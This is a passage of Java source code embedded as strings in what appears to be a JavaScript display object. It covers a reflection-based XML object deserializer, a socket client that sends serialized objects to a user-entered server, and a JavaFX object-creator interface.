		        if(ref.equals("java.util.List") || ref.equals("java.util.ArrayList") || ref.equals("java.util.LinkedList")){
		            return true;
		        }
		        else if(ref.equals("java.util.Map") || ref.equals("java.util.HashMap") || ref.equals("java.util.LinkedHashMap") || ref
		                .equals("java.util.TreeMap")) {
		            return true;
		        }
		        else if(ref.equals("java.util.Queue")){
		            return true;
		        }
		        else if(ref.equals("java.util.Deque") || ref.equals("java.util.ArrayDeque")){
		            return true;
		        }
		        else if(ref.equals("java.util.Set") || ref.equals("java.util.HashSet") || ref.equals("java.util.TreeSet") ||
		                ref.equals("LinkedHashSet")){
		            return true;
		        }
		        else{
		            return false;
		        }
		    }

		    public static void assignValues(HashMap myMap, List&ltElement&gt myList) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
		        for (int i=0; i &lt myList.size(); i++) {
		            Element listEle = (Element) myList.get(i);
		            Object instance = myMap.get(listEle.getAttributeValue("id"));
		            List&ltElement&gt children = listEle.getChildren();
		            if(isCollection(instance.getClass())){
		                String ref = instance.getClass().getName();
		                for(Element child : children) {
		                    Object copy = null;
		                    List&ltContent&gt content = child.getContent();
		                    if (ref.equals("java.util.List") || ref.equals("java.util.ArrayList") || ref.equals("java.util.LinkedList")) {
		                        assert (instance instanceof List);
		                        if(child.getName().equals("reference")) {
		                            ((List) instance).add(myMap.get(content.get(0).getValue()));
		                            myMap.put(listEle.getAttributeValue("id"), instance);
		                        }
		                        else {
		                            ((List) instance).add(content.get(0).getValue());
		                            myMap.put(listEle.getAttributeValue("id"), instance);
		                        }
		                    } else if (ref.equals("java.util.Map") || ref.equals("java.util.HashMap") || ref.equals("java.util.LinkedHashMap") || ref
		                            .equals("java.util.TreeMap")) {
		                            assert (instance instanceof Map);
		                            String sd = content.get(0).getValue();
		                            String dj = content.get(0).getCType().toString();
		                            String jg = content.get(2).getValue();
		                            String test = content.get(2).getCType().toString();
		                            Object c1 = "";
		                            Object c2 = "";
		                            if(dj.equals("Element")){
		                                c1 = myMap.get(sd);
		                            }
		                            else
		                                c1 = sd;
		                            if(test.equals("Element")){
		                                c2 = myMap.get(jg);
		                            }
		                            else
		                                c2 = jg;
		                            ((Map) instance).put(sd,jg);
		                            myMap.put(listEle.getAttributeValue("id"), instance);
		                    } else if (ref.equals("java.util.Queue")) {
		                        assert (instance instanceof Queue);
		                        if(child.getName().equals("reference"))
		                            ((Queue) instance).add(myMap.get(content.get(0).getValue()));
		                        else
		                            ((Queue) instance).add(content.get(0).getValue());
		                        myMap.put(listEle.getAttributeValue("id"), instance);
		                    } else if (ref.equals("java.util.Deque") || ref.equals("java.util.ArrayDeque")) {
		                        assert (instance instanceof Deque);
		                        if(child.getName().equals("reference"))
		                            ((Deque) instance).add(myMap.get(content.get(0).getValue()));
		                        else
		                            ((Deque) instance).add(content.get(0).getValue());
		                        myMap.put(listEle.getAttributeValue("id"), instance);
		                    } else if (ref.equals("java.util.Set") || ref.equals("java.util.HashSet") || ref.equals("java.util.TreeSet") ||
		                            ref.equals("LinkedHashSet")) {
		                        assert (instance instanceof Set);
		                        if(child.getName().equals("reference"))
		                            ((Set) instance).add(myMap.get(content.get(0).getValue()));
		                        else
		                            ((Set) instance).add(content.get(0).getValue());
		                        myMap.put(listEle.getAttributeValue("id"), instance);
		                    }
		                }

		            }
		            else if (!instance.getClass().isArray()) {
		                for (int j=0; j&ltchildren.size(); j++) {
		                    Element fElt = children.get(j);
		                    if(fElt.getName().equals("reference")){
		                        String val = fElt.getContent(0).getValue();
		                        Object hashValue = myMap.get(val);
		                        for(Field f : instance.getClass().getDeclaredFields()){
		                            f.setAccessible(true);
		                            if(isCollection(f.getType())){
		                                continue;
		                            }
		                            if(f.getType().getName().equals(hashValue.getClass().getName())){
		                                f.set(instance, hashValue);
		                            }
		                        }
		                    }
		                    else {
		                        String className = fElt.getAttributeValue("declaringclass");
		                        Class fieldDC = Class.forName(className);
		                        String fieldName = fElt.getAttributeValue("name");
		                        Field f = fieldDC.getDeclaredField(fieldName);
		                        f.setAccessible(true);
		                        if(fElt.getChildren().size() != 0) {
		                            Element vElt = (Element) fElt.getChildren().get(0);
		                            f.set(instance, deserializeValue(vElt, f.getType(), myMap));
		                        }
		                    }
		                }
		            } else {
		                for (int j=0; j&ltchildren.size(); j++) {
		                    Class comptype = instance.getClass().getComponentType();
		                    Element idxOrValue = children.get(j);
		                    int count;
		                    if(comptype.getName().charAt(0) != '[') {
		                        if(comptype.getName().charAt(comptype.getName().length() -1) == ';'){

		                        }
		                        else {
		                            Array.set(instance, j, deserializeValue(idxOrValue, comptype, myMap));
		                        }
		                    }
		                    else{
		                        Object object = null;
		                        int length2 = idxOrValue.getContentSize();
		                        if (comptype.getName().equals("[I")) {
		                            object = Array.newInstance(int.class, length2);
		                            comptype = int.class;
		                        }
		                        else if (comptype.getName().equals("[B")) {
		                            object = Array.newInstance(byte.class, length2);
		                            comptype = byte.class;
		                        }
		                        else if (comptype.getName().equals("[C")) {
		                            object = Array.newInstance(char.class, length2);
		                            comptype = char.class;
		                        }
		                        else if (comptype.getName().equals("[J")) {
		                            object = Array.newInstance(long.class, length2);
		                            comptype = long.class;
		                        }
		                        else if (comptype.getName().equals("[S")) {
		                            object = Array.newInstance(short.class, length2);
		                            comptype = short.class;
		                        }
		                        else if (comptype.getName().equals("[Z")) {
		                            object = Array.newInstance(boolean.class, length2);
		                            comptype = boolean.class;
		                        }
		                        else if (comptype.getName().equals("[D")) {
		                            object = Array.newInstance(double.class, length2);
		                            comptype = double.class;
		                        }
		                        else if (comptype.getName().equals("[F")) {
		                            object = Array.newInstance(float.class, length2);
		                            comptype = float.class;
		                        }
		                        else if(comptype.getName().equals("[Ljava.lang.String;")) {
		                            object = Array.newInstance(String.class, length2);
		                            comptype = String.class;
		                        }
		                        else {
		                            object = Array.newInstance(comptype, length2);
		                        }

		                        for(int k = 0; k &lt idxOrValue.getContentSize(); k++){
		                            Element sub = idxOrValue.getChildren().get(k);
		                            Object idxValue = deserializeValue(sub, comptype, myMap);
		                            Array.set(object, k, idxValue);
		                        }
		                        Array.set(instance, j, object);

		                    }
		                }

		            }
		        }

		    }

		    private static Object deserializeValue(Element vElt, Class&lt?&gt type, HashMap myMap) {
		        String valtype = vElt.getName();
		        if (valtype.equals("null"))
		            return null;
		        else if (valtype.equals("reference"))
		            return myMap.get(vElt.getText());
		        else {
		            if (type.equals(boolean.class)) {
		                if (vElt.getText().equals("true"))
		                    return Boolean.TRUE;
		                else
		                    return Boolean.FALSE;
		            }
		            else if (type.equals(byte.class))
		                return Byte.valueOf(vElt.getText());
		            else if (type.equals(short.class))
		                return Short.valueOf(vElt.getText());
		            else if (type.equals(int.class))
		                return Integer.valueOf(vElt.getText());
		            else if (type.equals(long.class))
		                return Long.valueOf(vElt.getText());
		            else if (type.equals(float.class))
		                return Float.valueOf(vElt.getText());
		            else if (type.equals(double.class))
		                return Double.valueOf(vElt.getText());
		            else if (type.equals(char.class))
		                return vElt.getText().charAt(0);
		            else
		                return vElt.getText();

		        }
		    }
		}`
	},
	cli: {
		type: 'java',
		code: `
		import org.jdom2.Document;
		import org.jdom2.output.Format;
		import org.jdom2.output.XMLOutputter;

		import java.io.*;
		import java.net.Socket;
		import java.net.UnknownHostException;
		import java.util.ArrayList;

		public class Client {

		    private Socket socket = null;
		    private BufferedReader input = null;
		    private PrintWriter out = null;
		    private String ip = "";
		    private int port = 0;
		    public Client(String ip, int port) {
		        this.ip = ip;
		        this.port = port;
		    }

		    public void connect(ArrayList&ltDocument&gt docList){
		        try {
		            socket = new Socket(ip, port);
		            out = new PrintWriter(socket.getOutputStream(), true);
		            input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		            System.out.println("Connected");
		            ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
		            try {
		                objectOutputStream.writeObject(docList);
		            } catch (IOException e) {
		                System.out.println("Could not send XML");
		            }
		        } catch (IOException e) {
		            e.printStackTrace();
		        }
		    }
		    public void stop() throws IOException {
		        input.close();
		        out.close();
		        socket.close();
		    }

		}`
	},
	obj: {
		type: 'java',
		code: `
		import javafx.application.Application;
		import javafx.fxml.FXMLLoader;
		import javafx.scene.Parent;
		import javafx.scene.Scene;
		import javafx.stage.Stage;

		import static javafx.application.Application.launch;

		public class ObjectCreator extends Application {

		    @Override
		    public void start(Stage primaryStage) throws Exception {
		        Parent root = FXMLLoader.load(getClass().getResource("ObjectCreator.fxml"));

		        primaryStage.setTitle("Object Creator");
		        primaryStage.setScene(new Scene(root, 800, 600));
		        primaryStage.show();
		    }

		    public static void main(String[] args){
		        launch(args);
		    }
		}`
	},
	objr: {
		type: 'java',
		code: `
		import java.lang.reflect.*;
		import java.util.*;

		public class ObjectCreatorReflective {

		    public static ArrayList&ltObject&gt getObjChecked() {
		        return OBJ_CHECKED;
		    }

		    public static void setObjChecked(ArrayList&ltObject&gt objChecked) {
		        OBJ_CHECKED = objChecked;
		    }

		    private static ArrayList&ltObject&gt OBJ_CHECKED = new ArrayList&lt&gt();


		    public ObjectCreatorReflective(){}


		    public static void notPrimitive(Field field, Object obj, int counter) throws IllegalAccessException,
		            NoSuchMethodException, InvocationTargetException, InstantiationException, ClassNotFoundException {
		        if(field.getType().isArray()) {
		            isAnArray(field, obj);
		            return;
		        }
		        Class newCO = Class.forName(field.getType().getName());
		        Object newField = newCO.getConstructor(new Class[] {}).newInstance();
		        for(Field f : newField.getClass().getDeclaredFields()) {
		            f.setAccessible(true);
		            if(!f.getType().isPrimitive() && !f.getType().getName().equals("java.lang.String")){
		                String fieldType = field.getType().getName();
		                String fType = f.getType().getName();
		                String objType = obj.getClass().getTypeName();
		                if(counter != 0 && fType.equals(objType))
		                    continue;
		                else {
		                    counter++;
		                    notPrimitive(f, newField, counter);
		                }
		            }
		            else if(f.getType().isArray()){
		                isAnArray(f, newField);
		            }
		            else if(f.getType().isPrimitive() || f.getType().getName().equals("java.lang.String")) {
		                ObjectCreatorController.createPopUp(f, newField, obj);
		            }
		        }
		        field.set(obj, newField);
		    }

		    public static boolean fieldNamesEqual(Object obj, Object parentObj) {
		        Field[] objField = obj.getClass().getDeclaredFields();
		        Field[] parentObjField = parentObj.getClass().getDeclaredFields();
		        boolean result = false;
		        if(objField.length == parentObjField.length){
		            for(int i = 0; i &lt objField.length; i++){
		                if(objField[i].getName().equals(parentObjField[i].getName()))
		                    result = true;
		                else
		                    result = false;
		            }
		        }
		        return result;
		    }

		    public static void parseFields(Field field, Object obj, String newStr) throws IllegalAccessException {
		        Class t = field.getType();
		        if (t.getName().equals("int"))
		            field.setInt(obj, Integer.parseInt(newStr));
		        else if (t.getName().equals("byte"))
		            field.setByte(obj, Byte.parseByte(newStr));
		        else if (t.getName().equals("short"))
		            field.setShort(obj, Short.parseShort(newStr));
		        else if (t.getName().equals("double"))
		            field.setDouble(obj, Double.parseDouble(newStr));
		        else if (t.getName().equals("float"))
		            field.setFloat(obj, Float.parseFloat(newStr));
		        else if (t.getName().equals("char")) {
		            if (newStr.length() &gt 1) {
		                ObjectCreatorController.throwRangeError(field);
		            }
		            field.setChar(obj, newStr.charAt(0));
		        } else if (t.getName().equals("boolean")) {
		            if (newStr.equals("1")) {
		                newStr = "true";
		            }
		            if (newStr.equals("0")) {
		                newStr = "false";
		            }
		            if (!newStr.equals("1") && !newStr.equals("0") && !newStr.equals("false") && !newStr.equals("true")) {
		                ObjectCreatorController.throwRangeError(field);
		            }
		            field.setBoolean(obj, Boolean.parseBoolean(newStr));
		        } else if (t.getName().equals("long"))
		            field.setLong(obj, Long.parseLong(newStr));
		        else if (t.getName().equals("java.lang.String"))
		            field.set(obj, newStr);

		    }

		    public static void isAnArray(Field field, Object obj) throws ClassNotFoundException, IllegalAccessException,
		            NoSuchMethodException, InvocationTargetException, InstantiationException {

		        field.setAccessible(true);
		        String arrClassName = field.getType().getName();
		        int dimensions = 0;
		        for(int i = 0; i &lt arrClassName.length(); i++){
		            if(arrClassName.charAt(i) == '[')
		                dimensions++;
		        }
		        int length = ObjectCreatorController.getTopLevelElements(1, field);
		        Object object = null;
		        if(dimensions == 1) {
		            arrClassName = arrClassName.substring(1);
		            if (arrClassName.equals("I"))
		                object = Array.newInstance(int.class, length);
		            else if (arrClassName.equals("B"))
		                object = Array.newInstance(byte.class, length);
		            else if (arrClassName.equals("C"))
		                object = Array.newInstance(char.class, length);
		            else if (arrClassName.equals("J"))
		                object = Array.newInstance(long.class, length);
		            else if (arrClassName.equals("S"))
		                object = Array.newInstance(short.class, length);
		            else if (arrClassName.equals("Z"))
		                object = Array.newInstance(boolean.class, length);
		            else if (arrClassName.equals("D"))
		                object = Array.newInstance(double.class, length);
		            else if (arrClassName.equals("F"))
		                object = Array.newInstance(float.class, length);
		            else if (arrClassName.equals("Ljava.lang.String;"))
		                object = Array.newInstance(String.class, length);
		            else{
		                object = Array.newInstance(Class.forName(arrClassName.replace(";","").replace("L","")
		                .replace("[","")), length);

		            }

		            for (int i = 0; i &lt length; i++) {
		                if (arrClassName.equals("I")) {
		                    String j = ObjectCreatorController.getDimensionPopup(0, i, field);
		                    Array.set(object, i, Integer.parseInt(j));
		                } else if (arrClassName.equals("B")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, Byte.parseByte(j));
		                }
		                else if (arrClassName.equals("C")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, j.charAt(0));
		                }
		                else if (arrClassName.equals("J")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, Long.parseLong(j));
		                }
		                else if (arrClassName.equals("S")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, Short.parseShort(j));
		                }
		                else if (arrClassName.equals("Z")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, Boolean.parseBoolean(j));
		                }
		                else if (arrClassName.equals("D")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, Double.parseDouble(j));
		                }
		                else if (arrClassName.equals("F")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, Float.parseFloat(j));
		                }
		                else if (arrClassName.equals("Ljava.lang.String;")){
		                    String j = ObjectCreatorController.getDimensionPopup(0,i,field);
		                    Array.set(object, i, j);
		                }
		                else{
		                    Class cls = Class.forName(arrClassName.replace("[","").replace("L","")
		                            .replace(";",""));
		                    Object objInArr = cls.getConstructor(new Class[] {}).newInstance();
		                    for(Field f : cls.getDeclaredFields()){
		                        f.setAccessible(true);
		                        if(f.getType().isPrimitive() || f.getType().getName().equals("java.lang.String"))
		                            ObjectCreatorController.getPrimitiveValue(f, objInArr);
		                        else if(f.getType().isArray())
		                            isAnArray(f, objInArr);
		                        else {
		                            notPrimitive(f, objInArr, 0);
		                        }
		                    }
		                    Array.set(object, i, objInArr);
		                }
		            }
		        }
		        else if (dimensions == 2){
		            int length2 = ObjectCreatorController.getTopLevelElements(2,field);
		            if (arrClassName.equals("[[I"))
		                object = Array.newInstance(int.class, length, length2);
		            else if (arrClassName.equals("[[B"))
		                object = Array.newInstance(byte.class, length, length2);
		            else if (arrClassName.equals("[[C"))
		                object = Array.newInstance(char.class, length, length2);
		            else if (arrClassName.equals("[[J"))
		                object = Array.newInstance(long.class, length, length2);
		            else if (arrClassName.equals("[[S"))
		                object = Array.newInstance(short.class, length, length2);
		            else if (arrClassName.equals("[[Z"))
		                object = Array.newInstance(boolean.class, length, length2);
		            else if (arrClassName.equals("[[D"))
		                object = Array.newInstance(double.class, length, length2);
		            else if (arrClassName.equals("[[F"))
		                object = Array.newInstance(float.class, length, length2);
		            else if(arrClassName.equals("[[Ljava.lang.String;"))
		                object = Array.newInstance(String.class, length, length2);
		            else
		                object = Array.newInstance(field.getType(), length, length2);
		            for(int i = 0; i &lt length; i++){
		                Object object2 = null;
		                if (arrClassName.equals("[[I"))
		                    object2 = Array.newInstance(int.class, length2);
		                else if (arrClassName.equals("[[B"))
		                    object2 = Array.newInstance(byte.class, length2);
		                else if (arrClassName.equals("[[C"))
		                    object2 = Array.newInstance(char.class, length2);
		                else if (arrClassName.equals("[[J"))
		                    object2 = Array.newInstance(long.class, length2);
		                else if (arrClassName.equals("[[S"))
		                    object2 = Array.newInstance(short.class, length2);
		                else if (arrClassName.equals("[[Z"))
		                    object2 = Array.newInstance(boolean.class, length2);
		                else if (arrClassName.equals("[[D"))
		                    object2 = Array.newInstance(double.class, length2);
		                else if (arrClassName.equals("[[F"))
		                    object2 = Array.newInstance(float.class, length2);
		                else if (arrClassName.equals("[[Ljava.lang.String;"))
		                    object2 = Array.newInstance(String.class, length2);
		                else
		                    object2 = Array.newInstance(field.getType(), length2);
		                for(int j = 0; j &lt length2; j++){
		                    String result = ObjectCreatorController.getDimensionPopup(i,j,field);
		                    if (arrClassName.equals("[[I"))
		                        Array.set(object2, j, Integer.parseInt(result));
		                    else if (arrClassName.equals("[[B"))
		                        Array.set(object2, j, Byte.parseByte(result));
		                    else if (arrClassName.equals("[[C"))
		                        Array.set(object2, j, result.charAt(0));
		                    else if (arrClassName.equals("[[J"))
		                        Array.set(object2, j, Long.parseLong(result));
		                    else if (arrClassName.equals("[[S"))
		                        Array.set(object2, j, Short.parseShort(result));
		                    else if (arrClassName.equals("[[Z"))
		                        Array.set(object2, j, Boolean.parseBoolean(result));
		                    else if (arrClassName.equals("[[D"))
		                        Array.set(object2, j, Double.parseDouble(result));
		                    else if (arrClassName.equals("[[F"))
		                        Array.set(object2, j, Float.parseFloat(result));
		                    else if (arrClassName.equals("[[Ljava.lang.String;"))
		                        Array.set(object2, j, result);
		                    else
		                        Array.set(object2, j, (Object) result);
		                }
		                Array.set(object, i, object2);
		            }
		        }
		        field.set(obj, object);
		    }

		    public static void isACollection(Field field, Object obj) throws NoSuchMethodException,
		            IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchFieldException {

		        String ref = field.getType().getName();
		        Class c = field.get(obj).getClass();
		        field.setAccessible(true);
		        int size = ObjectCreatorController.getCollectionSize(0, c);
		        if(ref.equals("java.util.List") || ref.equals("java.util.ArrayList") || ref.equals("java.util.LinkedList")){
		            List copy = null;
		            if(c.getName().equals("java.util.ArrayList")){
		                copy = (ArrayList&ltObject&gt) field.get(obj);
		            }
		            else if(c.getName().equals("java.util.LinkedList")){
		                copy = (LinkedList&ltObject&gt) field.get(obj);
		            }
		            else {
		                copy = (List&ltObject&gt) field.get(obj);
		            }
		            Object object = null;
		            Class component = Helper.guessComponents(copy);
		            while(copy.size() &lt size){
		                copy.add(null);
		            }
		            for(int i = 0; i &lt size; i++){
		                object = getObject(obj, component);
		                copy.set(i, object);
		            }
		            field.set(obj, copy);
		        }
		        else if(ref.equals("java.util.Map") || ref.equals("java.util.HashMap") || ref.equals("java.util.LinkedHashMap") || ref
		        .equals("java.util.TreeMap")) {
		            Map copy;
		            if (c.getName().equals("java.util.HashMap")) {
		                copy = (HashMap&ltObject, Object&gt) field.get(obj);
		            } else if (c.getName().equals("java.util.TreeMap")) {
		                copy = (TreeMap&ltObject, Object&gt) field.get(obj);
		            } else if (c.getName().equals("java.util.LinkedHashMap")) {
		                copy = (LinkedHashMap&ltObject, Object&gt) field.get(obj);
		            } else {
		                copy = (Map&ltObject, Object&gt) field.get(obj);
		            }

		            Class keys = Helper.guessKeyComponents(copy);
		            Class values = Helper.guessValueComponents(copy);
		            while(copy.size() &lt size){
		                copy.put(null,null);
		            }
		            for(int i = 0; i &lt size; i++){
		                Object key = null;
		                key = getObject(obj, keys);
		                Object value = null;
		                value = getObject(obj, values);
		                copy.put(key,value);
		            }
		            field.set(obj, copy);
		        }
		        else if(ref.equals("java.util.Queue")){
		            Queue&ltObject&gt copy = new Queue&lt&gt() {
		                @Override
		                public boolean add(Object o) {
		                    return false;
		                }

		                @Override
		                public boolean offer(Object o) {
		                    return false;
		                }

		                @Override
		                public Object remove() {
		                    return null;
		                }

		                @Override
		                public Object poll() {
		                    return null;
		                }

		                @Override
		                public Object element() {
		                    return null;
		                }

		                @Override
		                public Object peek() {
		                    return null;
		                }

		                @Override
		                public int size() {
		                    return 0;
		                }

		                @Override
		                public boolean isEmpty() {
		                    return false;
		                }

		                @Override
		                public boolean contains(Object o) {
		                    return false;
		                }

		                @Override
		                public Iterator&ltObject&gt iterator() {
		                    return null;
		                }

		                @Override
		                public Object[] toArray() {
		                    return new Object[0];
		                }

		                @Override
		                public &ltT&gt T[] toArray(T[] a) {
		                    return null;
		                }

		                @Override
		                public boolean remove(Object o) {
		                    return false;
		                }

		                @Override
		                public boolean containsAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public boolean addAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public boolean removeAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public boolean retainAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public void clear() {

		                }
		            };
		            Class type = Helper.guessQueueComponents(copy);
		            Object key = null;
		            while(copy.size() &lt size){
		                copy.add(null);
		            }
		            for(int i = 0; i &lt size; i++) {
		                key = getObject(obj, type);
		                copy.add(key);
		            }
		            field.set(obj, copy);
		        }
		        else if(ref.equals("java.util.Deque") || ref.equals("java.util.ArrayDeque")){
		            Deque copy;
		            if (c.getName().equals("java.util.ArrayDeque")) {
		                copy = (ArrayDeque&ltObject&gt) field.get(obj);
		            } else if (c.getName().equals("java.util.LinkedList")) {
		                copy = (LinkedList&ltObject&gt) field.get(obj);
		            } else {
		                copy = (Deque) field.get(obj);
		            }

		            Class type = Helper.guessQueueComponents(copy);
		            while(copy.size() &lt size){
		                copy.add(null);
		            }
		            Object key = null;
		            for(int i = 0; i &lt size; i++) {
		                key = getObject(obj, type);
		                copy.add(key);
		            }
		            field.set(obj, copy);
		        }
		        else if(ref.equals("java.util.Set") || ref.equals("java.util.HashSet") || ref.equals("java.util.TreeSet") ||
		        ref.equals("LinkedHashSet")){
		            Set copy;
		            if(c.getName().equals("java.util.HashSet")){
		                copy = (HashSet&ltObject&gt) field.get(obj);
		            }
		            else if(c.getName().equals("java.util.TreeSet")){
		                copy = (TreeSet&ltObject&gt) field.get(obj);
		            }
		            else if(c.getName().equals("LinkedHashSet")){
		                copy = (LinkedHashSet&ltObject&gt) field.get(obj);
		            }
		            else
		                copy = (Set&ltObject&gt) field.get(obj);

		            Class type = Helper.guessSetComponents(copy);
		            while(copy.size() &lt size){
		                copy.add(null);
		            }
		            Object key = null;
		            for(int i = 0; i &lt size; i++) {
		                key = getObject(obj, type);
		                copy.add(key);
		            }
		            field.set(obj, copy);
		        }

		    }

		    private static Object getObject(Object obj, Class component) throws InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
		        Object object;
		        if (checkPrimitive(component)[0].equals(true)) {
		            object = getPrimitive(component);
		        } else {
		            object = component.getConstructor(new Class[]{}).newInstance();
		            for (Field f : object.getClass().getDeclaredFields()) {
		                f.setAccessible(true);
		                if (!f.getType().isPrimitive() && !f.getType().getName().equals("java.lang.String")) {
		                    notPrimitive(f, object, 0);
		                } else if (f.getType().isArray()) {
		                    isAnArray(f, object);
		                } else if (f.getType().isPrimitive() || f.getType().getName().equals("java.lang.String")) {
		                    ObjectCreatorController.createPopUp(f, object, obj);
		                }
		            }
		        }
		        return object;
		    }

		    public static Object[] checkPrimitive(Class cls) {
		        Object[] objArr = {null, null};
		        if(cls.getName().equals("java.lang.Integer")) {
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Byte")) {
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Double")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Character")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Long")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Float")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Short")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.Boolean")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else if(cls.getName().equals("java.lang.String")){
		            objArr[0] = true;
		            objArr[1] = cls.getName();
		        }
		        else{
		            objArr[0] = false;
		            objArr[1] = cls.getName();
		        }
		        return objArr;
		    }

		    public static Object getPrimitive(Class cls){
		        Object toReturn = null;
		        if(cls.getName().equals("java.lang.Integer")) {
		            int i = Integer.parseInt(ObjectCreatorController.getObjectPrimitive(cls));
		            toReturn = i;
		        }
		        else if(cls.getName().equals("java.lang.Byte")) {
		            byte b = Byte.parseByte(ObjectCreatorController.getObjectPrimitive(cls));
		            toReturn = b;
		        }
		        else if(cls.getName().equals("java.lang.Double")){
		            double d = Double.parseDouble(ObjectCreatorController.getObjectPrimitive(cls));
		            toReturn = d;
		        }
		        else if(cls.getName().equals("java.lang.Character")){
		            char c = ObjectCreatorController.getObjectPrimitive(cls).charAt(0);
		            toReturn = c;
		        }
		        else if(cls.getName().equals("java.lang.Long")){
		            long l = Long.parseLong(ObjectCreatorController.getObjectPrimitive(cls));
		            toReturn = l;
		        }
		        else if(cls.getName().equals("java.lang.Float")){
		            float f = Float.parseFloat(ObjectCreatorController.getObjectPrimitive(cls));
		            toReturn = f;
		        }
		        else if(cls.getName().equals("java.lang.Short")){
		            short s = Short.parseShort(ObjectCreatorController.getObjectPrimitive(cls));
		            toReturn = s;
		        }
		        else if(cls.getName().equals("java.lang.Boolean")){
		            String s = ObjectCreatorController.getObjectPrimitive(cls);
		            if (s.equals("1")) {
		                s = "true";
		            }
		            if (s.equals("0")) {
		                s = "false";
		            }
		            boolean b = Boolean.parseBoolean(s);
		            toReturn = b;
		        }
		        else if(cls.getName().equals("java.lang.String")){
		            String s = ObjectCreatorController.getObjectPrimitive(cls);
		            toReturn = s;
		        }
		        return toReturn;

		    }
		}`
	},
	objc: {
		type: 'java',
		code: `
		import javafx.beans.value.ChangeListener;
		import javafx.beans.value.ObservableValue;
		import javafx.event.ActionEvent;
		import javafx.event.EventHandler;
		import javafx.fxml.FXML;
		import javafx.geometry.Pos;
		import javafx.scene.Scene;
		import javafx.scene.control.*;
		import javafx.scene.input.MouseEvent;
		import javafx.scene.input.PickResult;
		import javafx.scene.layout.BorderPane;
		import javafx.scene.layout.Pane;
		import javafx.scene.layout.VBox;
		import javafx.scene.paint.Color;
		import javafx.scene.text.Font;
		import javafx.scene.text.Text;
		import javafx.scene.text.TextAlignment;
		import javafx.stage.FileChooser;
		import javafx.stage.Popup;
		import javafx.stage.Stage;

		import java.io.File;
		import java.io.FilenameFilter;
		import java.io.IOException;
		import java.lang.reflect.Array;
		import java.lang.reflect.Field;
		import java.lang.reflect.InvocationTargetException;
		import java.lang.reflect.Type;
		import java.net.UnknownHostException;
		import java.nio.file.Files;
		import java.nio.file.Path;
		import java.nio.file.Paths;
		import java.nio.file.StandardCopyOption;
		import java.util.*;

		import org.jdom2.*;

		public class ObjectCreatorController {

		    @FXML
		    private ComboBox&ltString&gt classBox;

		    @FXML
		    private ComboBox&ltString&gt arrayTypeBox;

		    @FXML
		    private ComboBox&ltString&gt fieldBox;

		    @FXML
		    private TextField fieldText;

		    @FXML
		    private TextArea displayInfo;

		    @FXML
		    private TextArea objDisplay;

		    @FXML
		    private TextArea objDisplayData;

		    @FXML
		    private ProgressBar progBar;

		    @FXML
		    private TextField fieldText2;

		    @FXML
		    private Button serializeButton;

		    private Class classObj;
		    private Object obj;
		    private ArrayList&ltObject&gt objArr = new ArrayList&ltObject&gt();
		    private Object parentObj;
		    private ArrayList&ltFile&gt classesToLoad;

		    public void prepForSerialize() throws IllegalAccessException, IOException {
		        ArrayList&ltDocument&gt docList = new ArrayList&lt&gt();
		        for(Object o : objArr) {
		            Serializer ser = new Serializer();
		            Document serialized = ser.serialize(o);
		            docList.add(serialized);
		        }
		            String ip = ObjectCreatorController.getIPFromUser();
		            int port = Integer.parseInt(ObjectCreatorController.getPortFromUser());
		            Client client = new Client(ip, port);
		            client.connect(docList);
		            client.stop();
		    }

		    public static String getIPFromUser() {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter the IP you want to connect to: \\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter the IP: ");
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Submit IP");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING IP OF SERVER: ");
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                if(textArea.getText().equals(""))
		                    return;
		                else
		                    stage.close();
		            }
		        });
		        stage.showAndWait();
		        return textArea.getText();
		    }

		    public static String getPortFromUser(){
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter the port the server is listening on: \\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter the port: ");
